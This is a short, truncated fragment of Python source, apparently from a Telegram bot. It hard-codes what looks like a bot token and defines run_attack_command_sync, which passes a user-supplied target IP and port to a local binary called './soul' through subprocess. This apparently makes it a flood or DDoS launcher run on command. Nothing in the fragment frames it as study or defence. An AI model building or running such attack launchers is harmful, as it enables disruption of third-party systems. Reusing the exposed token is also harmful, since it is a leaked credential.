...
TOKEN = '7278795179:AAF23INuMV-0l9tV7jta23erCGVGBIvW8Q8'
...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "101"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
